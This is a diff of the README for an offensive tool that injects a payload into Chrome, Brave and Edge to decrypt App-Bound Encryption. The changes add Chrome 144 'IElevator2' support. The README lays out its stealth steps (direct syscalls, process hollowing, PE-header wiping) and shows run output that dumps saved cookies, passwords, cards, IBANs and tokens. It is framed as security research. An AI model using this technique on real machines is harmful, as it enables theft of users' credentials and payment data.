@@ -61,11 +61,14 @@ This tool's effectiveness is rooted in a combination of modern, evasion-focused 
 
 ## 📦 Supported & Tested Versions
 
-| Browser            | Tested Version (x64 & ARM64) |
-| ------------------ | ---------------------------- |
-| **Google Chrome**  | 143.0.7499.170               |
-| **Brave**          | 1.85.118 (143.0.7499.169)    |
-| **Microsoft Edge** | 144.0.3719.35                |
+| Browser                 | Tested Version (x64 & ARM64) |
+| ----------------------- | ---------------------------- |
+| **Google Chrome**       | 143.0.7499.193               |
+| **Google Chrome Beta**  | 144.0.7559.59                |
+| **Brave**               | 1.85.120 (143.0.7499.192)    |
+| **Microsoft Edge**      | 144.0.3719.67                |
+
+> **Note:** Chrome 144 introduces the new `IElevator2` COM interface. This tool automatically uses `IElevator2` when available and falls back to `IElevator` for Chrome 143 and earlier.
 
 ## 🔍 Feature Support Matrix
 
@@ -105,7 +108,7 @@ The tool's execution is focused on stealth and efficiency, built around a **Dire
     - **Destroys PE headers** by overwriting DOS/NT headers with pseudo-random data, eliminating MZ signature from memory.
     - Finally, invokes the payload's `DllMain`.
 2.  **Connection & Setup:** The `DllMain` spawns a new thread that immediately connects to the named pipe handle passed by the injector. It reads the configuration, including the output path, sent by the injector. All subsequent logs and status updates are relayed back through this pipe.
-3.  **Target-Context COM Hijack:** Now running natively within the browser process, the payload instantiates the browser's internal `IOriginalBaseElevator` or `IEdgeElevatorFinal` COM server. As the call originates from a trusted process path, all of the server's security checks are passed.
+3.  **Target-Context COM Hijack:** Now running natively within the browser process, the payload instantiates the browser's internal COM server (`IElevator2` for Chrome 144+, `IElevator` for earlier versions, or `IEdgeElevatorFinal` for Edge). As the call originates from a trusted process path, all of the server's security checks are passed.
 4.  **Master Key Decryption:** The payload calls the `DecryptData` method on the COM interface, providing the `app_bound_encrypted_key` it reads from the `Local State` file. The COM server dutifully decrypts the key and returns the plaintext AES-256 master key to the payload.
 5.  **Data Exfiltration:** Armed with the AES key, the payload enumerates all user profiles (`Default`, `Profile 1`, etc.). For each profile, it queries the relevant SQLite databases (`Cookies`, `Login Data`, `Web Data`), decrypts the data blobs using AES-256-GCM, and formats the secrets as JSON. The results are written directly to the output directory specified by the injector.
 6.  **Shutdown:** After processing all profiles, the payload sends a completion signal to the injector over the pipe and calls `FreeLibraryAndExitThread` to clean up. The injector, upon receiving the signal, terminates the parent host process with `NtTerminateProcess`.
@@ -149,9 +152,9 @@ _________ .__                         ___________.__                       __
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.17.3 by @xaitax
+ x64 & ARM64 | v0.18.0 by @xaitax
 
-  Usage: chromelevator.exe [options] <chrome|edge|brave|all>
+  Usage: chromelevator.exe [options] <chrome|chrome-beta|edge|brave|all>
 
   Options:
     -v, --verbose      Show detailed output
@@ -192,55 +195,66 @@ _________ .__                         ___________.__                       __
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.17.3 by @xaitax
+ x64 & ARM64 | v0.18.0 by @xaitax
 
-  ┌──── Brave ──────────────────────────────────────
+  ┌──── Brave (143.1.85.120) ──────────────────────
   │
   │ Decryption Key
   │ 2522A3C1730EA8EE84BAAD1994DB31E20437D9DCF27628997598BB5B86F73DCD
   │
   ├── Default
-  │   Cookies     2439/2460
-  │   Passwords   46
+  │   Cookies     3312
+  │   Passwords   55
   │   Cards       1
   │   IBANs       1
   │
-  └── 2439 cookies, 46 passwords, 1 cards, 1 IBANs (1 profile)
+  └── 3312 cookies, 55 passwords, 1 cards, 1 IBANs (1 profile)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave
 
-  ┌──── Chrome ──────────────────────────────────────
+  ┌──── Chrome (143.0.7499.193) ───────────────────
   │
   │ Decryption Key
   │ 3FA14DC988A34C85BDB872159B739634CB7E56F8E34449C1494297B9B629D094
   │
   ├── Default
-  │   Cookies     378/382
+  │   Cookies     380
   │   Passwords   1
   │
   ├── Profile 1
-  │   Cookies     815/820
-  │   Passwords   789
+  │   Cookies     932
+  │   Passwords   791
   │   Cards       1
   │   IBANs       1
-  │   Tokens      1
+  │   Tokens      2
   │
-  └── 1193 cookies, 790 passwords, 1 cards, 1 IBANs, 1 tokens (2 profiles)
+  └── 1312 cookies, 792 passwords, 1 cards, 1 IBANs, 2 tokens (2 profiles)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
 
-  ┌──── Edge ──────────────────────────────────────
+  ┌──── Chrome Beta (144.0.7559.59) ───────────────
+  │
+  │ Decryption Key
+  │ C147F0657D7AD5881F16CC0A2994E41A18A7B5F567B8CF81C7F87227ABB4F1B7
+  │
+  ├── Default
+  │   Cookies     224
+  │
+  └── 224 cookies (1 profile)
+      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome Beta
+
+  ┌──── Edge (144.0.3719.67) ──────────────────────
   │
   │ Decryption Key
   │ B0334FAD7F5805362CB4C44B144A95AB7A68F7346EF99EB3F175F09DB08C8FD9
   │
   ├── Default
-  │   Cookies     214/216
+  │   Cookies     226
   │   Passwords   2
   │   Cards       1
   │
   ├── Profile 1
   │   Cookies     25
   │
-  └── 239 cookies, 2 passwords, 1 cards (2 profiles)
+  └── 251 cookies, 2 passwords, 1 cards (2 profiles)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge
 ```
 
@@ -256,21 +270,21 @@ _________ .__                         ___________.__                       __
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.17.3 by @xaitax
+ x64 & ARM64 | v0.18.0 by @xaitax
 
-  ┌──── Chrome ──────────────────────────────────────
+  ┌──── Chrome (143.0.7499.193) ───────────────────
   │ Creating suspended process: C:\Program Files\Google\Chrome\Application\chrome.exe
-  │   [+] Process created (PID: 13020)
-  │   [+] IPC pipe established: \\.\pipe\chrome.sync.26370.18285.8B20
+  │   [+] Process created (PID: 26560)
+  │   [+] IPC pipe established: \\.\pipe\chrome.nacl.49645_5F55
   │ Deriving runtime decryption keys...
-  │   [+] Payload decrypted (1048 KB)
-  │   [+] Bootstrap entry point resolved (offset: 0x2a790)
+  │   [+] Payload decrypted (1073 KB)
+  │   [+] Bootstrap entry point resolved (offset: 0x2ae70)
   │ Allocating memory in target process via syscall...
-  │   [+] Memory allocated at 0x2245a600000 (1052 KB)
+  │   [+] Memory allocated at 0x268e2d90000 (1076 KB)
   │   [+] Payload + parameters written
   │   [+] Memory protection set to PAGE_EXECUTE_READ
   │ Creating remote thread via syscall...
-  │   [+] Thread created (entry: 0x2245a62a790)
+  │   [+] Thread created (entry: 0x268e2dbae70)
   │ Awaiting payload connection...
   │   [+] Payload connected
   │ Running in Chrome
@@ -279,21 +293,21 @@ _________ .__                         ___________.__                       __
   │ 3FA14DC988A34C85BDB872159B739634CB7E56F8E34449C1494297B9B629D094
   │
   ├── Default
-  │   Size        13 MB
-  │   Cookies     378/382
+  │   Size        14 MB
+  │   Cookies     380
   │   Passwords   1
   │
   ├── Profile 1
-  │   Size        739 MB
-  │   Cookies     815/820
-  │   Passwords   789
+  │   Size        491 MB
+  │   Cookies     932
+  │   Passwords   791
   │   Cards       1
   │   IBANs       1
-  │   Tokens      1
+  │   Tokens      2
   │ Extracting comprehensive fingerprint...
   │ Fingerprint saved to fingerprint.json
   │
-  └── 1193 cookies, 790 passwords, 1 cards, 1 IBANs, 1 tokens (2 profiles)
+  └── 1312 cookies, 792 passwords, 1 cards, 1 IBANs, 2 tokens (2 profiles)
       C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
 ```
 
@@ -439,7 +453,7 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
     This document covers:
 
     - The evolution from DPAPI to ABE.
-    - A step-by-step breakdown of the ABE mechanism, including `IElevator` COM interactions and key wrapping.
+    - A step-by-step breakdown of the ABE mechanism, including `IElevator`/`IElevator2` COM interactions and key wrapping.
     - Detailed methodology of the DLL injection strategy used by this tool.
     - Analysis of encrypted data structures and relevant Chromium source code insights.
     - Discussion of alternative decryption vectors and Chrome's evolving defenses.
@@ -453,7 +467,17 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
     - How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
     - A practical look at debugging tricky COM interoperability issues.
 
-3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**
+3.  ➡️ **[The Elevator Gets an Upgrade: Chrome 144, IElevator2, and the Mojo Horizon](docs/The_Elevator_Gets_an_Upgrade_Chrome_144_IElevator2_and_the_Mojo_Horizon.md)**
+
+    This article covers Chrome 144's new `IElevator2` COM interface and what it means for ABE:
+
+    - Technical comparison between Chrome 143's `IElevator` and Chrome 144's `IElevator2` interfaces.
+    - Analysis of the two new methods (`RunIsolatedChrome`, `AcceptInvitation`) and their connection to Chromium's planned Mojo IPC migration.
+    - VTable layout comparison showing backward compatibility preservation.
+    - Edge 144's partial adoption of `IElevator2` and new Copilot interfaces.
+    - Honest assessment of what Mojo migration does (and doesn't) change for ABE security.
+
+4.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**
 
     This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:
 
